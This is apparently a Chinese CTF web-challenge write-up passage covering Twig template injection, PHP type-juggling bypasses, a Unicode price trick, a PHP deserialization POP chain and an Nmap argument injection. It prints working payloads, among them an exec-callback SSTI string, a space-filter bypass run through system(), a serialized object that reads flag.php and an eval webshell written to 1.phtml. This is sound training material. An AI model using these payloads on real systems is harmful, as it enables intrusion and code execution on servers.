<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在user处尝试注入</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="number">7</span>*<span class="string">&#x27;7&#x27;</span>&#125;&#125; 回显<span class="number">7777777</span> ==&gt; Jinja2</span><br><span class="line">&#123;&#123;<span class="number">7</span>*<span class="string">&#x27;7&#x27;</span>&#125;&#125; 回显<span class="number">49</span> ==&gt; Twig </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665913711976-0bb9cf0c-91d4-48f8-8a60-d556516de13a.png#averageHue=%23eceee9&clientId=u1b2b1bcb-8f71-4&from=paste&height=362&id=ub7ab29da&name=image.png&originHeight=453&originWidth=1116&originalType=binary&ratio=1&rotation=0&showTitle=false&size=228850&status=done&style=none&taskId=uc2cdc51d-33a9-451d-995c-3bab57e0915&title=&width=892.8" alt="image.png"><br>OK是Twig，找个poc：</p>
<p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("id")&#125;&#125; </code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665913756957-e20b7aff-2763-4470-8712-51cd5d350192.png#averageHue=%23ebebe5&clientId=u1b2b1bcb-8f71-4&from=paste&height=406&id=u24e2a0a5&name=image.png&originHeight=508&originWidth=1178&originalType=binary&ratio=1&rotation=0&showTitle=false&size=272869&status=done&style=none&taskId=u3d870095-93e7-4508-a028-95c32b630a2&title=&width=942.4" alt="image.png"><br> 这边要说一下，exec和system与shell_exec都是有区别的，exec只会返回最后一行的数据，所以这波盲猜flag真正的文件在根目录，你可以看看：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665913804349-e0d47f1a-85e1-44d8-9a85-f09a51b83581.png#averageHue=%23e3e4d6&clientId=u1b2b1bcb-8f71-4&from=paste&height=357&id=u89b9a911&name=image.png&originHeight=446&originWidth=1123&originalType=binary&ratio=1&rotation=0&showTitle=false&size=210172&status=done&style=none&taskId=ubfda30aa-2b76-403f-9cb3-9b7b3c66fee&title=&width=898.4" alt="image.png"><br>就只出来了一个</p>
<h2 id="WUSTCTF2020-朴实无华（科学计数法"><a href="#WUSTCTF2020-朴实无华（科学计数法" class="headerlink" title="[WUSTCTF2020]朴实无华（科学计数法)"></a>[WUSTCTF2020]朴实无华（科学计数法)</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665985639397-59bbd8c5-1024-4a3b-a0ce-db79ab254e39.png#averageHue=%23d5b781&clientId=u24e9da00-09b0-4&from=paste&height=141&id=u9ff5fccb&name=image.png&originHeight=176&originWidth=1737&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32197&status=done&style=none&taskId=u62ca3741-48e5-4753-bf48-48ee8591aa0&title=&width=1389.6" alt="image.png"><br>查看robots.txt:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665985660338-2d922037-b456-424e-a562-c823e5369369.png#averageHue=%23cfc199&clientId=u24e9da00-09b0-4&from=paste&height=118&id=u14a3888a&name=image.png&originHeight=147&originWidth=1007&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15718&status=done&style=none&taskId=u42451461-e89d-49fa-b84e-0749aaaa60b&title=&width=805.6" alt="image.png"><br>访问：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665985687228-8498d4b5-e3df-4a11-b441-118df571f653.png#averageHue=%23fefefe&clientId=u24e9da00-09b0-4&from=paste&height=677&id=u33f271ea&name=image.png&originHeight=846&originWidth=1759&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61427&status=done&style=none&taskId=u4d5f79ae-40d4-46dd-b13d-e882b6b1a6c&title=&width=1407.2" alt="image.png"><br>访问：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;蹇埌闈炴床浜�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>ta</span><br></pre></td></tr></table></figure>
<p>全是乱码但这就是题目，不影响，先看level1<br>其实我觉得level1就是最难的了，intval怎么样才可以达到那样的条件呢？测试了很多发现和版本有关系，题目是php5版本<br>在php7以下的版本会发生这种事情：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1e1&#x27;</span>)=<span class="number">1</span></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1e1&#x27;</span>+<span class="number">1</span>)=<span class="number">11</span></span><br></pre></td></tr></table></figure>
<p>前者被当成字符串所以是1，后者被解析成了科学计数法，利用这一点可以过第一关<br><code>?num=1e8</code><br>第二关：<br>要md5加密前后值相同，也就是都为0e开头：<br><code>?md5=0e1137126905</code><br>第三关：<br>最简单的一关了，大致的意思就是参数中不能有空格，cat，白给<br><code>get_flag=tac%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665985875860-3004db8d-23c1-4681-9e01-c4ac14190214.png#averageHue=%23d5d1cb&clientId=u24e9da00-09b0-4&from=paste&height=105&id=u94ed4bc8&name=image.png&originHeight=131&originWidth=1772&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105224&status=done&style=none&taskId=uc4751973-18c3-4cb8-b655-173ebdc9802&title=&width=1417.6" alt="image.png"></p>
<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>考点是unicode字符串解析过程<br>参考文章：<a target="_blank" rel="noopener" href="https://guokeya.github.io/post/UtMQ2MAtQ/">https://guokeya.github.io/post/UtMQ2MAtQ/</a><br>看了就懂了<br>最后的payload：<br><code>id=1&amp;price=𐄣</code>，<code>𐄣</code>解码后就成了2000，大于1337<br>找这些东西的网址：<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/plane">https://www.compart.com/en/unicode/plane</a><br>直接搜<code>two thousand</code>即可</p>
<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码如上：<br>**__get():**当类调用一个不存在或者是私有属性触发<br>**__tostring():**当把类当成字符串时触发<br>__**invoke():**当类被当时函数时触发<br>**__wakeup():**反序列化时触发<br>这边触发pop链的整体思路为：<br>反序列化时，触发<code>__wakeup</code>，然后preg_match触发<code>__tostring</code>，然后利用<code>return $this-&gt;str-&gt;source;</code>，让str等于test类，去访问不存在的source属性，触发<code>__get</code>，然后触发<code>__invoke</code>，同时让var等于<code>php://filter/convert.base64-encode/resource=flag.php</code>，这就是完整的pop链，构造本地文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source=<span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="variable language_">$this</span>-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&#x27;aaa&#x27;</span>);<span class="comment">#初始化show类</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="variable">$a</span>);<span class="comment">#令source=new show()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span>	</span><br></pre></td></tr></table></figure>
<p>这边我们的Show类的构造函数给了个$file，所以一定要随便传的什么，否则报错<br>最后不URL编码的结果为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Show&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Modifier&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;*var&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;&#125;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Modifier&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;*var&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>url编码的结果为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Show%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>source%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Show%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>source%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>aaa%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>str%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Test%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>p%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>Modifier%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span><span class="keyword">var</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A52%<span class="number">3</span>A%<span class="number">22</span>php%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Ffilter%<span class="number">2</span>Fconvert.base64-encode%<span class="number">2</span>Fresource%<span class="number">3</span>Dflag.php%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>str%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Test%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>p%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>Modifier%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span><span class="keyword">var</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A52%<span class="number">3</span>A%<span class="number">22</span>php%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Ffilter%<span class="number">2</span>Fconvert.base64-encode%<span class="number">2</span>Fresource%<span class="number">3</span>Dflag.php%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p>最后pop传参获得flag：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666070578067-4a9f8158-857b-4e60-a158-5b255eb3f9dc.png#averageHue=%23bfc6bd&clientId=u582f6382-5571-4&from=paste&height=90&id=uded9d075&name=image.png&originHeight=112&originWidth=1760&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31491&status=done&style=none&taskId=u11dbb8c2-80ec-44b8-aacd-539a76f2037&title=&width=1408" alt="image.png">	<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666070580963-3415a42f-f0ae-4c54-bc4e-6aa2f30423f9.png#averageHue=%23fdfcfb&clientId=u582f6382-5571-4&from=paste&height=131&id=u6d259c45&name=image.png&originHeight=164&originWidth=719&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17976&status=done&style=none&taskId=u24f05a42-5ddd-4dbd-9dab-e8cf0c58a4e&title=&width=575.2" alt="image.png"></p>
<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666072905519-fd22665a-80c6-4f0f-bdb2-e91705896bd7.png#averageHue=%23121629&clientId=u582f6382-5571-4&from=paste&height=218&id=ufaf82f0a&name=image.png&originHeight=273&originWidth=1103&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28232&status=done&style=none&taskId=u01250c2b-7869-4f95-8d39-ae781b53631&title=&width=882.4" alt="image.png"><br>随便输入一个地址：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666072919583-d018a2f2-38f3-43df-ba7a-aa447d6ebbc1.png#averageHue=%23f4f4f4&clientId=u582f6382-5571-4&from=paste&height=245&id=ue4b8ff1f&name=image.png&originHeight=306&originWidth=1183&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19520&status=done&style=none&taskId=ue445c954-7ae4-4598-8cc5-78c056c154b&title=&width=946.4" alt="image.png"><br>就会给你namp出来结果，所以指令应该就是<code>namp xxxxx 你的输入</code><br>然后抱着试一试的心态我在想，之前做过一道escapeshellarg函数和escapeshellcmd函数结合的题，所以我就输入了一个<code>127 &#39;</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666073048391-12494dee-9336-4e77-9dd7-92e4fa402b29.png#averageHue=%23f7f6f6&clientId=u582f6382-5571-4&from=paste&height=140&id=u5c77f1d4&name=image.png&originHeight=175&originWidth=656&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5323&status=done&style=none&taskId=uc0504bdd-9d82-4dbb-9987-204b946667c&title=&width=524.8" alt="image.png"><br>给转义了，所以我就觉得这道题对参数进行了上面2个函数的结合，然后经过一系列fuzz发现ban掉了php，所以参数不可以带php，那这样payload就很显而易见了，用短标签去写shell：<br><code>127.0.0.1 &#39;  &lt;?=eval($_POST[1]);?&gt; -oG 1.phtml  &#39;</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666073147127-1df782be-6641-4f3a-a25b-8e43ec36a0e4.png#averageHue=%23979696&clientId=u582f6382-5571-4&from=paste&height=769&id=ub5b2f887&name=image.png&originHeight=961&originWidth=1768&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117957&status=done&style=none&taskId=u5bb108c2-a641-4497-a683-4f642095c5e&title=&width=1414.4" alt="image.png"><br>成功getshell</p>
<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p>进入页面就给了源码：</p>
